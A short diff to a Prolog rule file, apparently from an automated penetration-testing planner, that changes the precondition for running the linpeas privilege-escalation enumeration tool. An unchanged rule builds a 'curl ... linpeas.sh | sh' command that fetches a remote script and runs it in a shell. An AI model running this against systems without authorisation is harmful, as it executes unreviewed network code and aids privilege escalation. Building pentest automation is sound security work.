@@ -39,7 +39,7 @@ full_scan(Parameters, Command) :-
 
 tool(linpeas, linpeas).
 
-profile(linpeas, []) :- shell(connection), linpeas([], Command), \+executed(Command).
+profile(linpeas, []) :- connection(connection), linpeas([], Command), \+executed(Command).
 
 linpeas(Parameters, Command) :- 
 	format_command("curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh", [], Command). 
